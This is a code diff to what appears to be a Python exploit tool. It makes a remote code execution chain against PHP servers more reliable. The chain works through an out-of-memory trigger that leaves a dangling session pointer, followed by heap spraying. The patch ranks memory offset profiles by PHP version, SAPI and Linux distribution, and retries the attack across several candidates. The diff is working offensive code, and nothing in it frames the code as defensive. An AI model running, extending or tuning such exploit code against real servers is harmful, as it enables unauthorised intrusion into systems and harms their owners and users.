@@ -20,7 +20,7 @@ import re
 import socket
 import sys
 import time
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import urlsplit
 
 from .assess import assess_all, assess_exploit
@@ -978,46 +978,72 @@ def _try_chain_d_rce(
     port = parsed_url.port or 80
     boundary = "C" * 10
 
-    # --- Detect offset profile ---
+    # --- Rank candidate offset profiles (best match first) ---
     chain_d_profiles = _load_chain_d_profiles(chain_d_offsets_path)
     php_version = getattr(profile, "php_version", None)
     sapi_hint = getattr(profile, "sapi", None)
 
-    # Try exact version match first, then partial, then arch fallback
-    profile_key = None
-    offsets = None
-    for key, offs in chain_d_profiles.items():
-        if php_version and php_version in key:
-            if sapi_hint and sapi_hint in key:
-                profile_key = key
-                offsets = offs
+    # Detect distro from build_metadata or Server header
+    distro_hint = None
+    build_meta = getattr(profile, "build_metadata", {}) or {}
+    if build_meta.get("distro"):
+        distro_hint = build_meta["distro"]
+    packaging = getattr(profile, "packaging", None)
+    if not distro_hint and packaging:
+        for d in ("trixie", "bookworm", "bullseye", "buster", "alpine"):
+            if d in packaging.lower():
+                distro_hint = d
                 break
-            elif not offsets:
-                profile_key = key
-                offsets = offs
 
-    if not offsets:
-        # Partial version match (major.minor)
-        partial = ".".join(php_version.split(".")[:2]) if php_version else None
-        if partial:
-            for key, offs in chain_d_profiles.items():
-                if partial in key:
-                    profile_key = key
-                    offsets = offs
-                    break
+    candidates: List[Tuple[str, Dict[str, int], str]] = []
+    seen_keys: set = set()
+    partial = ".".join(php_version.split(".")[:2]) if php_version else None
 
-    if not offsets:
+    # Tier 1: exact version + sapi + distro match
+    if distro_hint:
         for key, offs in chain_d_profiles.items():
-            if "x86_64" in key:
-                profile_key = key
-                offsets = offs
-                break
+            if (php_version and php_version in key
+                    and sapi_hint and sapi_hint in key
+                    and distro_hint in key):
+                candidates.append((key, offs, "exact+distro"))
+                seen_keys.add(key)
 
-    if not offsets:
+    # Tier 2: exact version + sapi match
+    for key, offs in chain_d_profiles.items():
+        if (key not in seen_keys and php_version and php_version in key
+                and sapi_hint and sapi_hint in key):
+            candidates.append((key, offs, "exact"))
+            seen_keys.add(key)
+
+    # Tier 3: exact version, any sapi (prefer distro match)
+    for key, offs in chain_d_profiles.items():
+        if key not in seen_keys and php_version and php_version in key:
+            tier = "version+distro" if distro_hint and distro_hint in key else "version"
+            candidates.append((key, offs, tier))
+            seen_keys.add(key)
+
+    # Tier 4: major.minor match (prefer distro match)
+    if partial:
+        for key, offs in chain_d_profiles.items():
+            if key not in seen_keys and partial in key:
+                tier = "partial+distro" if distro_hint and distro_hint in key else "partial"
+                candidates.append((key, offs, tier))
+                seen_keys.add(key)
+
+    # Tier 5: any x86_64 profile as last resort
+    for key, offs in chain_d_profiles.items():
+        if key not in seen_keys and "x86_64" in key:
+            candidates.append((key, offs, "arch-fallback"))
+            seen_keys.add(key)
+
+    if not candidates:
         result["notes"].append("no matching offset profile found")
         return result
 
-    result["notes"].append(f"using offset profile: {profile_key}")
+    result["notes"].append(
+        f"found {len(candidates)} candidate profile(s): "
+        + ", ".join(f"{k} ({t})" for k, _, t in candidates[:5])
+    )
 
     # --- Pin workers ---
     holders: List[socket.socket] = []
@@ -1035,18 +1061,26 @@ def _try_chain_d_rce(
         {"parts": 400, "depth": 32, "pad_blocks": 80, "pad_size": 16000},
     ]
 
+    # Total attempts = max_attempts per candidate, cycling through profiles
+    total_attempts = max(max_attempts, len(candidates))
+
     try:
         import urllib.parse
 
-        for attempt in range(max_attempts):
+        for attempt in range(total_attempts):
+            cand_idx = attempt % len(candidates)
+            profile_key, offsets, match_tier = candidates[cand_idx]
             spray = SPRAY_CONFIGS[min(attempt, len(SPRAY_CONFIGS) - 1)]
             session_id = f"{'A' * 26}{attempt:02d}"
 
             if attempt > 0:
                 result["notes"].append(
-                    f"--- retry {attempt + 1}/{max_attempts} "
-                    f"(spray: parts={spray['parts']}, depth={spray['depth']}) ---"
+                    f"--- attempt {attempt + 1}/{total_attempts} "
+                    f"profile={profile_key} ({match_tier}), "
+                    f"spray: parts={spray['parts']}, depth={spray['depth']} ---"
                 )
+            else:
+                result["notes"].append(f"using profile: {profile_key} ({match_tier})")
 
             # --- A1: trigger OOM to get dangling PS(id) ---
             result["notes"].append("A1: sending OOM trigger")
@@ -1257,7 +1291,7 @@ def _try_chain_d_rce(
 
         if not result["success"]:
             result["notes"].append(
-                f"all {max_attempts} attempts exhausted without confirmed RCE"
+                f"all {total_attempts} attempts ({len(candidates)} profiles) exhausted without confirmed RCE"
             )
 
     finally:
